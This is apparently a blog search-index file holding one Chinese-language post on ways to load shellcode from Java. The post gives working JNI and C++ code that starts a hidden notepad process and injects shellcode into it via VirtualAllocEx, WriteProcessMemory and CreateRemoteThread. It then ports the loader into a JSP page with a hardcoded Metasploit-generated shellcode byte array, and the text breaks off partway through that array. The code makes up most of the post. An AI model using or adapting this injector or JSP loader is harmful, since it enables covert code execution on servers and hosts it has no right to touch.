<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>java加载shellcode方法整理</title>
    <link href="/2022/06/01/java%E5%8A%A0%E8%BD%BDshellcode%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"/>
    <url>/2022/06/01/java%E5%8A%A0%E8%BD%BDshellcode%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>需要先准备好一个dll文件，然后在导出函数中实现执行shellcode的方法，在java通过JNI调用dll的导出函数执行指定shellcode</p><p>声明一个native方法，然后在dll文件中实现这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">inject</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] me)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据Hello.java生成C文件头</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javah </span>-classpath . -<span class="hljs-keyword">jni </span>Hello<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/XYZYcT"><img src="https://s1.ax1x.com/2022/06/01/XYZYcT.png" alt="XYZYcT.png"></a></p><p>在JDK下的include目录下找到jni.h，include/win32下找到jni_md.h还有之前编译好的Hello.h文件拷贝到项目目录下。导入dll项目</p><p><a href="https://imgtu.com/i/XYZlAs"><img src="https://s1.ax1x.com/2022/06/01/XYZlAs.png" alt="XYZlAs.png"></a></p><p>开始实现对应的功能，java中的byte[]对应jni中的jbyteArray类型。在导出函数里转换了一下传入的参数，然后在inject函数中执行传入的shellcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;Hello.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inject</span><span class="hljs-params">(LPCVOID buffer, <span class="hljs-keyword">int</span> length)</span></span>;<br><br><span class="hljs-function">JNIEXPORT <span class="hljs-keyword">void</span> JNICALL <span class="hljs-title">Java_Hello_inject</span><span class="hljs-params">(JNIEnv* env, jobject object, jbyteArray jdata)</span> </span>&#123;<br>    jbyte* data = env-&gt;GetByteArrayElements(jdata, <span class="hljs-number">0</span>);<br>    jsize length = env-&gt;GetArrayLength(jdata);<br>    inject((LPCVOID)data, (SIZE_T)length);<br>    env-&gt;ReleaseByteArrayElements(jdata, data, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inject</span><span class="hljs-params">(LPCVOID buffer, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    STARTUPINFO si;<br>    PROCESS_INFORMATION pi;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>    SIZE_T wrote;<br>    LPVOID ptr;<br>    <span class="hljs-keyword">char</span> lbuffer[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">char</span> cmdbuff[<span class="hljs-number">1024</span>];<br><br>    <span class="hljs-comment">/* reset some stuff */</span><br>    ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>    si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>    ZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br><br>    <span class="hljs-comment">/* start a process */</span><br>    GetStartupInfo(&amp;si);<br>    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;<br>    si.wShowWindow = SW_HIDE;<br>    si.hStdOutput = <span class="hljs-literal">NULL</span>;<br>    si.hStdError = <span class="hljs-literal">NULL</span>;<br>    si.hStdInput = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/* resolve windir? */</span><br>    GetEnvironmentVariableA(<span class="hljs-string">&quot;windir&quot;</span>, lbuffer, <span class="hljs-number">1024</span>);<br><br>    <span class="hljs-comment">/* setup our path... choose wisely for 32bit and 64bit platforms */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IS64_</span><br>    _snprintf(cmdbuff, <span class="hljs-number">1024</span>, <span class="hljs-string">&quot;%s\\SysWOW64\\notepad.exe&quot;</span>, lbuffer);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    _snprintf(cmdbuff, <span class="hljs-number">1024</span>, <span class="hljs-string">&quot;%s\\System32\\notepad.exe&quot;</span>, lbuffer);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">/* spawn the process, baby! */</span><br>    <span class="hljs-keyword">if</span> (!CreateProcessA(<span class="hljs-literal">NULL</span>, cmdbuff, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi))<br>        <span class="hljs-keyword">return</span>;<br><br>    hProcess = pi.hProcess;<br>    <span class="hljs-keyword">if</span> (!hProcess)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">/* allocate memory in our process */</span><br>    ptr = (LPVOID)VirtualAllocEx(hProcess, <span class="hljs-number">0</span>, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-comment">/* write our shellcode to the process */</span><br>    WriteProcessMemory(hProcess, (LPTHREAD_START_ROUTINE)ptr, buffer, (SIZE_T)length, (SIZE_T*)&amp;wrote);<br>    <span class="hljs-keyword">if</span> (wrote != length)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">/* create a thread in the process */</span><br>    CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)ptr, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>把dll编译好，然后<code>System.load</code>加载dll文件，执行shellcode。这里用msf生成个弹计算器的shellcode测试一下</p><p><a href="https://imgtu.com/i/XYZUuF"><img src="https://s1.ax1x.com/2022/06/01/XYZUuF.png" alt="XYZUuF.png"></a></p><h1 id="JNI（jsp）"><a href="#JNI（jsp）" class="headerlink" title="JNI（jsp）"></a>JNI（jsp）</h1><p>JNI函数的函数名必须为<code>JAVA_包名_类名_函数名</code>这种形式，jsp会被编译成class文件后类名和包名都会发生变化，所以需要依据jsp的规则修改下才能执行</p><p>编译后的的格式：</p><ul><li>包名：org.apache.jsp</li><li>类名：文件名_jsp</li></ul><p>根据jsp的写法，这个native方法一般会出现在内部类JniClass里面，<code>org.apache.jsp.test_jsp$JniClass</code>，所以需要依据内部类来生成头文件</p><p><a href="https://imgtu.com/i/XYZtjU"><img src="https://s1.ax1x.com/2022/06/01/XYZtjU.png" alt="XYZtjU.png"></a></p><p>这里一直报找不到类的错误，把内部类单独写成一个java文件才解决</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javah -classpath . -jni org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jsp</span>.test_jsp<span class="hljs-variable">$JniClass</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/XYZaB4"><img src="https://s1.ax1x.com/2022/06/01/XYZaB4.png" alt="XYZaB4.png"></a></p><p><a href="https://imgtu.com/i/XYZdHJ"><img src="https://s1.ax1x.com/2022/06/01/XYZdHJ.png" alt="XYZdHJ.png"></a></p><p>导入生成的头文件，其他的跟原来一样，然后生成头文件</p><p><a href="https://imgtu.com/i/XYZBNR"><img src="https://s1.ax1x.com/2022/06/01/XYZBNR.png" alt="XYZBNR.png"></a></p><p>执行成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JniClass</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">inject</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] me)</span></span>;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-keyword">byte</span> buf[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]<br>            &#123;<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xfc</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x60</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xb7</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xac</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x61</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x02</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xed</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x42</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x85</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x74</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x67</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe3</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x34</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xac</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x38</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x03</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x08</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x45</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x39</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x66</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x1c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x04</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5e</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xec</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x12</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x57</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8d</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x87</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xbb</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xb5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xa2</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span 